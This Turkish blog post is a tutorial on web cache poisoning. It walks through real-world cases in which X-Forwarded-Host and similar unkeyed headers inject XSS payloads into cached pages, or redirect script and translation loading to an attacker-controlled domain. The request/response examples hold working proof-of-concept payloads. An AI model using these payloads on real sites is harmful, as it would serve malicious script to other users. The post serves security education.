---
sitemap: true
layout: b-post
title:  "Örneklerle Web Cache Poisoning"
modified:
author: Taylan Özgür Bildik
tags: [web, güvenlik]
categories: blog 
cover: web-cache-poisoning-cover.png
permalink: /:title
toc: true
---

# Temel Konseptler

## Önbelleğe Almaya Giriş

Önbellek zehirlenmesi(Cache poisoning) konusunu anlamak için temelde web önbellek(cache) mekanizmasının nasıl çalıştığını bilmemiz gerek.

Web önbelleği, uygulama sunucusu ile kullanıcı arasında yer alır. Bu sayede belirli yanıtların kopyalarını kaydedip, gerektiğinde uygulama sunucusuna gitmeden kullanıcılara bu yanıt kopyaları sunabilirler. Örnek olarak aşağıdaki diyagramda aynı kaynağa erişmeye çalışan üç kullanıcı bulunuyor.

![onbellek-mekanizmasi]({{ site.url }}/blog/img/web-cache-poisoning/onbellek-mekanizmasi.png){:class="responsive img-zoomable"}

Diyagram üzerinden de görebildiğiniz gibi bu yaklaşım sayesinde, aynı istek için her defasında uygulama sunucusu ile iletişime geçip meşguliyet yaratmaya gerek  kalmaz. Önbellek yaklaşımı sayesinde, gecikmeyi azaltarak sayfa yüklemelerini hızlandırmak ve ayrıca uygulama sunucusundaki yükü azaltmak mümkün olur. Peki önbellek mekanizmaları nasıl sağlanır ?

Bazı şirketler Varnish gibi yazılımları kullanarak kendi önbelleklerini barındırırken diğerleri, önbelleklerin coğrafi konumlara dağıldığı Cloudflare gibi bir **C**ontent **D**elivery **N**etwork (**CDN**) yani İçerik Dağıtım Ağı'na güvenmeyi tercih eder. Bu sayede global ölçekte kullanıcılara en yakın önbellek sunucuları üzerinden ilgili yanıt hızla dönülebilir. 

Ayrıca bu yaklaşımlar dışında Drupal gibi bazı popüler web uygulamalar ve frameworkler de zaten halihazırda yerleşik bir önbelleğe sahiptir. Bu sayede uygulama sunucusunun her defasında ilgili yanıtı sıfırdan işlemesine gereken kalmadan yanıt döndürülebilir. 

<p class="mavi"><strong>ℹ️ Not:</strong> İstemci tarafında depolanan tarayıcı önbellekleri ve DNS önbellekleri gibi başka önbellek türleri de mevcut lakin bunlar bu araştırmanın odak noktası olmadığı için bunları şimdilik es geçebiliriz.</p>

## Önbellek anahtarları | **Cache keys**

Peki hangi istekler önbellekte tutulur ? Neticede tüm istekler önbelleğe alınmayacağına göre hangi isteklerin seçileceğine nasıl karar verilir ? 

Önbelleğe hangi isteklerin alınması gerektiğine karar vermek için istekle birlikte gelen bazı değerlerin “**anahtar**” yani “**key**” olarak seçilip, bu anahtarlara göre benzersiz önbellekler tutulması gerekir. Peki bu ne demek oluyor. Örneğin basit bir önbellek mekanizmasında; statik içeriğe sahip sayfa için aynı URL adresini ziyaret edecek olan iki kullanıcı düşünelim. Bu önbellek mekanizması URL adresine bakarak ilk istekten sonra sunucunun döndürmüş olduğu yanıtı, tam olarak bu URL adresi ile eşleştirerek tekrar bu URL talep edildiğinde hızlıca önbellekten bu yanıtı döndürebilir.

Aşağıdaki gibi spesifik bir URL adresine GET isteğinde bulunulduğunu farz edelim.

![istek-bilesenleri]({{ site.url }}/blog/img/web-cache-poisoning/istek-bilesenleri.png){:class="responsive img-zoomable"}

Önbellek sunucusu da önbelleğe aldığı verilere tekrar erişmek üzere her birine benzersiz bir anahtar tanımlamak durumunda. Anahtar tanımlamak için da <span style="color:red">Method</span>, <span style="color:green">URL</span>, <span style="color:DodgerBlue">Protocol Sürümü</span> ve <span style="color:brown">Host</span> başlığını kullanıp bir çeşit algoritma ile benzersiz bir key yani anahtar üretebilir.

![cache-key-uretimi]({{ site.url }}/blog/img/web-cache-poisoning/cache-key-uretimi.png){:class="responsive img-zoomable"}

Burada benim verdiğim örnek yalnızca “**key**” yani “**anahtar**” kavramını basit şekilde açıklamak için. Önbellek mekanizması, benzersiz anahtar üretimi için HTTP isteğindeki hangi kısımları dikkate alacağına kendisi(nasıl konfigüre edildiyse) karar verir. Buradaki örneğimizde HTTP isteğinde yer alan “<span style="color:red">Method</span>, <span style="color:green">URL</span>, <span style="color:DodgerBlue">Protocol Sürümü</span> ve <span style="color:brown">Host</span> başlığı” bilgileri “**key**” üretimi için kullanılan “**cache key**” değerleridir. Örneğin yalnızca URL üzerinden cache key üreten önbellek mekanizmasında; sadece URL dikkate alınır ve yalnızca bu URL’in bulunduğu HTTP istekleri bu önbelleğe erişebilir. 

Bu durumun daha net anlaşılması için cache hizmeti de sunan bir CDN olan cloudflare üzerinde yer alan “cache rules” sekmesinden, önbellekleme için gerekli olan şartların ne kadar çeşitli olabileceğine bizzat kendiniz de göz atabilirsiniz.

![cdn-cache-kurallari]({{ site.url }}/blog/img/web-cache-poisoning/cdn-cache-kurallari.png){:class="responsive img-zoomable"}

Gördüğünüz gibi gelen istekteki pek çok farklı kriteri "**and**" "**or**" yani “**ve**” “**veya**” koşullarıyla birbirine bağlayarak, önbellek oluşturma kuralını istediğimiz gibi düzenleyebiliyoruz. Pek çok önbellek mekanizması da benzer şekilde kuralları özelleştirme noktasında bu şekilde imkanlar tanıyor.

Önbelleğe alma kavramı basit gözükebilir ancak bazı durumlarda risk teşkil edebiliyor. Önbellek mekanizması bir kaynak için bir istek aldığında, bu kaynağın bir kopyasının önceden kaydedilmiş olup olmadığına ve bununla yanıt verip veremeyeceğine veya isteği uygulama sunucusuna iletmesi gerekip gerekmediğine karar vermesi gerekiyor.

Kullanıcılardan gelen iki isteğin aynı kaynağı talep edip etmediğini belirlemek çoğunlukla zordur. Örneğin toplam bayt uzunluğunun aynı olması durumu geçersizdir çünkü bayt uzunluğunu etkileyebilecek `User-Agent` gibi kullanıcı tarafına özel olarak değişen başlıklar mevcuttur. Kullanıcılar aynı tarayıcıyı kullanıyor olsa bile sürüm farkından dolayı toplam bayt birbirine eşit olmayabilir. 

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /blog/post.php?mobile<span class="o">=</span>1 HTTP/1.1
Host: example.com
<span style="color:DodgerBlue">User-Agent: Mozilla/5.0 … Firefox/57.0</span>
Accept: <span class="k">*</span>/<span class="k">*</span><span class="p">;</span> <span class="nv">q</span><span class="o">=</span>0.01
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Referer: https://google.com/
Cookie: <span class="nv">jessionid</span><span class="o">=</span>xyz<span class="p">;</span>
Connection: close
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /blog/post.php?mobile<span class="o">=</span>1 HTTP/1.1
Host: example.com
<span style="color:DodgerBlue">User-Agent: Mozilla/5.0 … Firefox/58.112</span>
Accept: <span class="k">*</span>/<span class="k">*</span><span class="p">;</span> <span class="nv">q</span><span class="o">=</span>0.01
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Referer: https://google.com/
Cookie: <span class="nv">jessionid</span><span class="o">=</span>xyz<span class="p">;</span>
Connection: close
</code></pre></div></div>

Bu sebeple her iki kullanıcının da aynı kaynağa erişmek istediğini toplam bayt üzerinden tayin etmeye çalışmak sağlıklı değildir. 

Zaten bu sebeple biraz önce bahsettiğimiz gibi önbellek mekanizmaları bu sorunu çözmek üzere, gelen HTTP isteğinde yer alan bazı belirli bileşenleri önbellek anahtarı üretmek üzere kabul edip işler. **Yani HTTP isteğindeki her veri değil, yalnızca bazı bileşenler dikkate alınır.**  Anlatımlar sırasında anahtar üretimi için kullanılan HTTP bileşenlerini mavi renkle özellikle belirtiyor olacağım. Yukarıdaki bir önceki örnek çıktılarına bakacak olursanız mavi renkle işaretlenmiş kısımlar aslında önbellek mekanizması için önbellek anahtarı oluşturmak adına dikkate alınan kısımlardır. Bunlar dışındaki HTTP istek içeriğindeki tüm bileşenler “**unkeyed input**”, yani anahtarlanmamış ya da daha doğrusu anahtarlama için kullanılmayan girdilerdir. Bu kavramlar önemli olduğu için iyi anlaşılmaları önemli.

Yani örneğin **URL** ve **Host** başlığına göre anahtar oluşturan bir önbellek mekanizması için aşağıdaki iki HTTP isteği de aynı kabul edilir. Dolayısıyla ilk istek için üretilmiş olan yanıt önbellek üzerinden ikinci isteğe de dönülür.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET <span style="color:DodgerBlue">/blog/post.php?mobile<span class="o">=</span>1</span> HTTP/1.1
<span style="color:DodgerBlue">Host: example.com</span>
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: <span style="color:red"><span class="nv">language</span><span class="o">=</span><span class="nb">tr</span></span><span class="p">;</span>
Connection: close
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET <span style="color:DodgerBlue">/blog/post.php?mobile<span class="o">=</span>1</span> HTTP/1.1
<span style="color:DodgerBlue">Host: example.com</span>
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: <span style="color:red"><span class="nv">language</span><span class="o">=</span>en</span><span class="p">;</span>
Connection: close
</code></pre></div></div>

Eğer dikkat edecek olursanız, her iki istekteki <span style="color:red">dil farklı olduğu için</span> ikinci isteğe önbellekten döndürülen yanıt aslında kullanıcı için yanlış dildedir. Bu durumun nedeni; “anahtarlama” için kullanılmayan tüm diğer kısımların, önbellekten yanıt verilen tüm kullanıcılara değişmeden iletiliyor olması tabii. Kötü niyetli olanları da dahil!

Aslında teorik olarak Cache mekanizmasındaki anahtar oluşturmak için kullanılması gerekenlerin belirtildiği konfigürasyonlara ek olarak, anahtarlanması istenen tüm ek istek başlıklarını belirtmek için web sunucusu yanıtında '`Vary`' başlığı kullanılabilir. Fakat pratikte Cloudflare gibi CDN'ler `Vary` başlığını göz ardı edip yalnızca kendi konfigürasyonları dahilinde anahtar oluşturduğu için `Vary` başlığı çoğu durumda etkisiz kalabiliyor.  

Yine de `Vary` başlığını görmezden gelmeyen bir cache mekanizması kullanıldığı durumda; yukarıdaki örnekte dil tercihinin de önbellek anahtarı oluşturulurken dikkate alınması için `Vary: Cookie` şeklinde web sunucusu yanıtı olarak iletilmesi sağlanabilir. Fakat tahmin edebileceğiniz gibi Cookie bilgisinin önbelleğe alınıp diğer kullanıcılara bu önbellekteki yanıtı döndürmek felaket derecede hatalı bir yaklaşım olurdu. Zaten sırf bu ve bunun gibi hatalı konfigürasyonlardan kaçınmak için çoğu cache mekanizması `Vary` başlığını görmezden gelebiliyor.

# Önbellek Zehirlenmesi | **Cache Poisoning**

Önbellek zehirlenmesi, zararlı olabilecek yanıtın önbelleğe kaydolmasını sağlayan istek göndermektir. 

![portswigger-cache-poisoning]({{ site.url }}/blog/img/web-cache-poisoning/portswigger-cache-poisoning.png){:class="responsive img-zoomable"}
Kaynak:Portswigger

Bu yazıda önbellek anahtarı için kullanılmayan HTTP başlıkları gibi girişleri(unkeyed input) kullanarak önbellek zehirlemesini ele alacağız. Tabii ki önbellek zehirlemesi için tek yaklaşım bu değil. HTTP Response Splitting ve [Request Smuggling](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) yaklaşımları da kullanılabilir. Ayrıca web önbellek mekanizmasının “[Web Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)” ismi verilen başka bir zafiyete yol açtığını da belirtmek isterim. Lakin “[Web Cache Deception](https://linuxdersleri.net/web-cache-deception) ” ile önbellek zehirlenmesini karıştırmayın lütfen. İkisi farklı yaklaşımlar. Tek ortak noktası web önbelleklerinin neden olmasıdır. 

## Metodoloji

Cache poisoning zafiyetleri için aşağıdaki metodolojiyi kullanıyor olacağız:

![portswigger-metodoloji]({{ site.url }}/blog/img/web-cache-poisoning/portswigger-metodoloji.png){:class="responsive img-zoomable"}
Kaynak:Portswigger

İlk adım olarak unkeyed input yani anahtar olarak kabul edilmeyen girdileri bulmamız gerekiyor. Bu işi manuel olarak tek tek elle yapmak fevkalade zor bu sebeple Param Miner isimli burp eklentisini kullanarak header/cookie isimlerini otomatik olarak test edip, yanıtlar üzerindeki etkilerine bakıyor olacağız. 

Anahtarlanmamış bir giriş bulduktan sonra, sonraki adımlar onunla ne kadar hasar verebileceğinizi değerlendirmek ve ardından onu önbellekte saklamaya çalışmaktır. Eğer önbelleğe alınmasını sağlayamazsanız, önbelleğin nasıl çalıştığını daha iyi anlamanız ve önbelleğe alınabilir bir hedef sayfayı bulmanız gerekiyor. Bir sayfanın önbelleğe alınıp alınmayacağı, dosya uzantısı, içerik türü, dizin adresi, durum kodu ve yanıt başlıkları gibi çeşitli faktörlere bağlı olabilir.

Önbellekten dönülen aynı yanıtlar dolayısıyla, bulmaya çalıştığımız diğer anahtar olarak kullanılmayan girişler maskelenebilir. Yani başka anahtarsız girişler olsa bile önbellek dolayısıyla bunları fark etmeyebiliriz. Bu sebeple her bir isteğin benzersiz olmasını sağlamak için önbellek bozucu rastgele bir değeri her denemede göndermemiz gerekir. Eğer keşif için param miner kullanıyorsanız parametre olarak $randomplz ekleyerek her isteğin benzeriz bir önbellek anahtarına sahip olmasını sağlayabilirsiniz. Ayrıca bu sayede canlı ortamda çalışan bir websitesini, diğer kullanıcılara zarar vermeden önbelleğe alma davranışları açısından kolayca test etmeniz de mümkün olur. 

## Gerçek Dünyadan Vakalar

### Basit Zehirleme

Param Miner, Red Hat’in ana sayfasında anahtar olarak kullanılmayan bir girdi buldu.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en?cb<span class="o">=</span>1 HTTP/1.1
Host: www.redhat.com
<span style="color:DodgerBlue">X-Forwarded-Host: canary</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:image"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"https://<span style="color:DodgerBlue">canary</span>/cms/social.png"</span> /&gt;
</code></pre></div></div>

Yanıta baktığımızda `X-Forwarded-Host` başlığının, Open Graph URL meta etiketi oluşturmada kullanıldığını görebiliyoruz.

<p class="mavi"><strong>ℹ️ Not:</strong> <strong><em>Open Graph</em></strong>&nbsp;Protokolü,&nbsp;<strong><em>URL</em></strong>‘lerin sosyal medyada paylaşıldığında nasıl görüntüleneceğini kontrol eden bir çözümdür.</p>

`X-Forwarded-Host` başlığının yanıta yansıdığını gördükten sonra ilk adım bunu nasıl kötüye kullanabileceğimizi keşfetmekte. Örneğin XSS payload’ı ekleyip deneyebiliriz.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en?<span style="color:DodgerBlue">onbellekdenemesi<span class="o">=</span>1</span> HTTP/1.1
Host: www.redhat.com
<span style="color:DodgerBlue">X-Forwarded-Host: a.<span class="s2">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</span></span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:image"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"https://a."</span><span style="color:DodgerBlue"><span class="o">&gt;</span>&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt;</span><span class="s2">"/&gt; 
</span></code></pre></div></div>

Evet istediğimiz xss yükünü yanıta ekleyebildik. Şimdi bu yanıtın diğer kullanıcılar gösterilebilmesi için önbelleğe alındığından emin olmamız gerek. Bu noktada yanıtta yer alan `Cache-Control: no-cache` başlığının bizi vazgeçirmesine izin vermemeliyiz. Zira bir saldırı girişiminde bulunmak, işe yaramayacağını varsaymaktan her zaman daha iyidir. Önbelleğe alınma durumunu, isteği kötü amaçlı başlık olmadan yeniden göndererek ve ardından URL'yi doğrudan farklı bir makinedeki(mümkünse farklı bir public ip üzerinden) tarayıcıdan açarak kesin olarak doğrulayabilirsiniz:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en?<span style="color:DodgerBlue">onbellekdenemesi<span class="o">=</span>1</span> HTTP/1.1
Host: www.redhat.com
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
…
&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:image"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"https://a."</span><span style="color:DodgerBlue"><span class="o">&gt;</span>&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt;</span><span class="s2">"/&gt; 
</span></code></pre></div></div>

Görüldüğü gibi farklı bir cihazdan aynı link ziyaret edildiğinde, istekte herhangi bir ek başlık olmamasına rağmen xss yükünün bulunduğu yanıtın önbellekten döndürüldüğünü teyit etmiş olduk.

Kısa bir DNS sorgusu ile www.redhat.com’un aslında [www.redhat.com.edgekey.net](http://www.redhat.com.edgekey.net) adresinin CNAME’i olarak tutulduğunu, dolayısıyla Akamai’nin CDN hizmetini kullanarak cache sunduğunu da teyit edebiliyoruz. 

```bash
$$ nslookup.exe www.redhat.com
Server:  one.one.one.one
Address:  1.1.1.1

Non-authoritative answer:
Name:    e3396.dscx.akamaiedge.net
Addresses:  2a02:26f0:fa00:1a7::d44
          2a02:26f0:fa00:1af::d44
          2.20.169.214
Aliases:  www.redhat.com
          ds-www.redhat.com.edgekey.net
          ds-www.redhat.com.edgekey.net.globalredir.akadns.net
```

### Gizli Zehirlenme

Önceki örnekte sitenin gerçek ziyaretçilerini etkilememek için https://www.redhat.com/en?<span style="color:DodgerBlue">onbellekdenemesi=1</span> adresini zehirleyerek zafiyetin varlığını kanıtladık. Eğer doğrudan ana sayfayı zehirlemek istiyorsak, önbelleğe alınan yanıtın süresi dolduktan hemen sonra bizim zararlı yükü barındıran isteği gönderip bunun önbelleğe alınmasını sağlamamız gerekiyor.

Bunu kaba yoldan veya daha stratejik biçimde gerçekleştirebiliriz. Kaba yol olarak burp intruder veya benzeri bir script yazarak sürekli olarak aynı isteği gönderip, zamanı geldiğinde bu isteğin önbelleğe alınmasını sağlayabiliriz. Fakat bu çoğu durumda rate limit dolayısıyla şüpheli işlem kısıtlamalarına takılacaktır. Bunun yerine cache geçerlilik mekanizmasının nasıl çalıştığını anlayıp tam zamanında isteği göndermek çok daha zarif bir yaklaşım. Eğer yanıtlarda açıkça önbelleğin geçerlilik süresi belirtilmiyorsa bu tespiti gerçekleştirmek biraz zorlayıcı olabilir.

Yine de pek çok websitesi önbellek geçerlilik süresi hakkında yanıtlarda bilgi sunabiliyor.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: unity3d.com
<span style="color:DodgerBlue">X-Host: portswigger-labs.net</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Via: 1.1 varnish-v4
Age: 174
Cache-Control: public, max-age<span class="o">=</span>1800
…
&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"https://<span style="color:DodgerBlue">portswigger-labs.net</span>/sites/files/foo.js"</span><span class="o">&gt;</span>&lt;/script&gt;
</code></pre></div></div>

Burada, `X-Host` başlığının anahtar olarak kullanılmadığı ve yanıtta yansıtıldığını görebiliyoruz. Ayrıca yanıtta yer alan `Cache-Control: max-age=1800` değeri sayesinde önbelleğe alınan verilerin ne kadar süreyle önbellekte tutulduğu konusunda da bilgi edinebiliyoruz. Birlikte ele alındığında bunlar bize, yanıtımızın önbelleğe alınmasını sağlamak için veri yükümüzü göndermemiz gereken tam saniyeyi söyler.

### Seçici-Hedef Odaklı Zehirleme

HTTP başlıkları cache mekanizmaları konusunda pek çok yararlı bilgi sunabiliyor. Aşağıdaki örnek, Fastly kullanan popüler bir websitesine ait.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: redacted.com
User-Agent: Mozilla/5.0 … Firefox/60.0
<span style="color:DodgerBlue">X-Forwarded-Host: a<span class="s2">"&gt;&lt;iframe onload=alert(1)&gt;</span>
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Served-By: cache-lhr6335-LHR
Vary: User-Agent, Accept-Encoding
…
&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"canonical"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"https://a"</span><span style="color:DodgerBlue"><span class="o">&gt;</span>a&lt;iframe <span class="nv">onload</span><span class="o">=</span>alert<span class="o">(</span>1<span class="o">)&gt;</span></span>
&lt;/iframe&gt; 
</code></pre></div></div>

Bu örnek başlangıçta ilk örnekle neredeyse aynı görünüyor. Ancak `Vary` başlığı bize `User-Agent`’in önbellek anahtarının bir parçası olabileceğini belirtiyor ve manuel testler bunu doğruluyor. Bu durum, Firefox 60 kullandığımızı iddia ettiğimiz için, istismarımızın yalnızca diğer Firefox 60 kullanıcılarına sunulacağı anlamına geliyor. Dolayısıyla hedef odaklı seçici bir saldırı için bu tür anahtar değerleri kullanılabilir. 

### DOM Zehirleme

Anahtar olarak kullanılmayan girdilere XSS yükleri ekleyerek zafiyet oluşturmak her zaman mümkün olmayabilir. 

Örneğin aşağıdaki istek ve yanıt üzerinden ilerleyecek olursak;

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /dataset HTTP/1.1
Host: catalog.data.gov
<span style="color:DodgerBlue">X-Forwarded-Host: canary</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
&lt;body data-site-root<span class="o">=</span><span class="s2">"https://<span style="color:DodgerBlue">canary</span>/"</span><span class="o">&gt;</span>
</code></pre></div></div>

Çıktıdan anlaşıldığı üzere data-site-root değerini kontrol edebiliyoruz. Ancak XSS elde etmek için tırnak dışına çıkamıyoruz. Hatta bu özelliğin tam olarak ne için kullanıldığını da belli değil. Öğrenmek için Burp’ta tüm isteklere bir `X-Forwarded-Host: id-burpcollaborator.net` başlığı ekleyecek bir bul-değiştir kuralı tanımlayıp sitede gezinebiliriz. Bu gezinti neticesinde bazı sayfalar yüklendiğinde sunucuya JavaScript tarafından oluşturulan aşağıdaki istek gönderildi.

```bash
GET /api/i18n/en HTTP/1.1
Host: id.burpcollaborator.net
```

```bash
HTTP/1.1 200 OK
…
{}
```

Bu **/api/i18n/en** yolu, web sitesinde bir yerde, bazı lokalleştirme verilerinin nereden yükleneceğine karar vermek için data-site-root özelliğini kullanan JavaScript kodunun bulunduğunu gösteriyor. https://catalog.data.gov/api/i18n/en adresini ziyaret ettiğimizde yalnızca boş bir JSON yanıtı mevcut. Neyse ki '**en**' değerini '**es**' olarak değiştirdiğimizde bir ipucu elde ediyoruz:

```bash
GET /api/i18n/es HTTP/1.1
Host: catalog.data.gov
```

```bash
HTTP/1.1 200 OK
…
{"Show more":"Mostrar más"}
```

Buradaki dosya, cümleleri kullanıcının seçtiği dile çevirmek için bir harita içeriyor. Kendi çeviri dosyamızı oluşturarak ve kullanıcıları buna yönlendirmek için önbellek zehirlenmesini kullanarak, çeviriyi kötüye kullanabiliriz. Bunun için kendi websitemiz üzerinde örneğin linuxdersleri.net**/api/i18n/en** adresinde `{"Show more":"<svg onload=alert(1)>"}` gibi bir json yanıtı sunabiliriz. Bu sayede biz kendi websitemizi `X-Forwarded-Host` başlığı ile önbelleğe kaydettiğimizde bizim websitemizdeki /api/i18n/en adresine istek yapılıp, “show more” ifadesinin yer aldığı her yere XSS payload’ı konularak zafiyet tetiklenmiş edilmiş olacak. 

```bash
GET /dataset HTTP/1.1
Host: catalog.data.gov
X-Forwarded-Host: linuxdersleri.net

HTTP/1.1 200 OK
Age: 32707
X-Cache: Hit from cloudfront 
…
<body data-site-root="https://linuxdersleri.net/">
```

Bu istek önbelleğe alındığında, arkaplanda otomatik olarak [linuxdersleri.net/api/i18n/en](http://linuxdersleri.net/api/i18n/en) adresindeki çeviri verisi çekilip ilgili ifade yerini alıyor olacak.  

```bash
GET  /api/i18n/en HTTP/1.1
Host: linuxdersleri.net
```

```bash
HTTP/1.1 200 OK
...
{"Show more":"<svg onload=alert(1)>"}
```

Dolayısıyla “Show more” ifadesinin yer aldığı tüm sayfalarda kullanıcılar XSS’e maruz kalacak.

### Mozilla SHIELD'ın ele geçirilmesi | **Hijacking Mozilla SHIELD**

James Kettle, [catalog.data.gov](http://catalog.data.gov/) üzerinde gerçekleştirdiği araştırma esnasında uyguladığı `XFH` başlığı için bul-değiştir kuralı sayesinde Mozilla Shield mekanizmasında da bir zafiyet keşfetmiş. Proxy üzerinde istekte yer alan tamamı küçük harfli `origin: null` başlığı dikkatini çekmiş. 

```bash
GET /api/v1/recipe/signed/ HTTP/1.1
Host: xyz.burpcollaborator.net
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: application/json
origin: null
X-Forwarded-Host: xyz.burpcollaborator.net
```

Peki bu `origin: null` ne anlama geliyor ve ne zaman kullanılır diye kısaca açıklayacak olursak:

1. **Yönlendirmeler**: Bir sayfa başka bir sayfaya yönlendirildiğinde, tarayıcı bazen yönlendirme sürecinde kaynak bilgisini kaybeder ve bu durumda "**null**" kökeni kullanır.
2. **Yerel HTML Dosyaları**: Yerel olarak açılan HTML dosyaları, internete bağlı olmadıkları için bir kökene sahip değildirler ve bu nedenle "**null**" kökeni kullanırlar.

---

Bu bilgi ışığında araştırmacı; proxy loglarını incelerken, Firefox’un pazarlama ve araştırma amacıyla uzantıları sessizce yüklemek için SHIELD sisteminin bir parçası olarak bir “recipes” yani 'tarifler' listesi getirmeye çalıştığını fark etmiş. `X-Forwarde-Host` başlığı da bu sistemi kandırıp “tarifleri” almak için Firefox’u araştırmacının kendi websitesine yönlendirdiğini görmüş.

```bash
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: xyz.burpcollaborator.net
```

```bash
HTTP/1.1 200 OK
{
  "action-list": "https://xyz.burpcollaborator.net/api/v1/action/",
  "action-signed": "https://xyz.burpcollaborator.net/api/v1/action/signed/",
  "recipe-list": "https://xyz.burpcollaborator.net/api/v1/recipe/",
  "recipe-signed": "https://xyz.burpcollaborator.net/api/v1/recipe/signed/",
   …
}
```

Tarif yönergesi yani recipe içeriği de aşağıdaki gibi görünüyormuş:

```bash
[{
  "id": 403,
  "last_updated": "2017-12-15T02:05:13.006390Z",
  "name": "Looking Glass (take 2)",
  "action": "opt-out-study",
  "addonUrl": "https://normandy.amazonaws.com/ext/pug.mrrobotshield1.0.4-signed.xpi",
  "filter_expression": "normandy.country in  ['US', 'CA']\n && normandy.version >= '57.0'\n)",
  "description": "MY REALITY IS JUST DIFFERENT THAN YOURS",
}]
```

Üstelik bu sistem NGINX’in önbellek mekanizmasını kullandığı için bu zararlı yanıtın önbelleğe kaydedilerek diğer tüm Firefox kullanıcılarına sunulması ihtimalini ortaya çıkarmış. Sonuçta Firefox'un on milyonlarca günlük kullanıcısının araştırmacının web sitesinden tarifler alacağı bir zafiyet oluşmuş. 

Tarifler imzalı olduğu için doğrudan kullanıcılara zararlı olabilecek eklentileri kurup çalıştırtmak mümkün olmasa da tüm kullanıcıları istediği adrese yönlendirmenin oluşturabileceği DDoS saldırısı mümkündür. Ayrıca bulunacak olası bir memory corruption zafiyeti ile çok daha tehlikeli zafiyetlerin zincirleme sonucu ortaya çıkması da olasılık dahilinde.

### Yönlendirme Zehirlemesi | **Route poisoning**

Bazı uygulamalar URL oluşturmak için HTTP başlıklarını hatalı şekilde kullanmanın ötesinde, bunları dahili istek yönlendirme için de kullanma hatasına düşebiliyor.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: www.goodhire.com
<span style="color:DodgerBlue">X-Forwarded-Server: test-degeri</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 404 Not Found
CF-Cache-Status: MISS
…
&lt;title&gt;HubSpot - Page not found&lt;/title&gt;
&lt;p&gt;The domain <span style="color:DodgerBlue">test-degeri</span> does not exist <span class="k">in </span>our system.&lt;/p&gt;
</code></pre></div></div>

Alınan çıktından anlaşıldığı üzere [Goodhire.com](http://goodhire.com/) HubSpot'ta barındırılıyor ve HubSpot, `X-Forwarded-Server` başlığına `Host` başlığından daha fazla öncelik veriyor ve bu durum isteğin hangi istemciye yönelik olduğu konusunda kafa karışıklığı yaratıyor.

Bu durumdan yararlanmak için hubspot.com'a gitmemiz, kendimizi bir HubSpot istemcisi olarak kaydetmemiz, HubSpot sayfamıza bir XSS payload eklememiz ve ardından son olarak HubSpot'u goodhire.com'da bu yanıtı sunması için kandırmamız gerekiyor:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: www.goodhire.com
<span style="color:DodgerBlue">X-Forwarded-Host: portswigger-labs-4223616.hs-sites.com</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
…
<span style="color:DodgerBlue">&lt;script&gt;alert<span class="o">(</span>document.domain<span class="o">)</span>&lt;/script&gt;</span>
</code></pre></div></div>

Servis cloudflare ile önbellek tutuğu için bu zararlı yanıt önbellek üzerinden sonraki ziyaretçilere sunulmuş oldu.

### Gizli Yönlendirme Zehirlemesi

Yönlendirme zehirlemesi açıkları her zaman bir önceki örnekte olduğu kadar aşikar olmayabilir:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
Host: blog.cloudflare.com
<span style="color:DodgerBlue">X-Forwarded-Host: test-degeri</span>
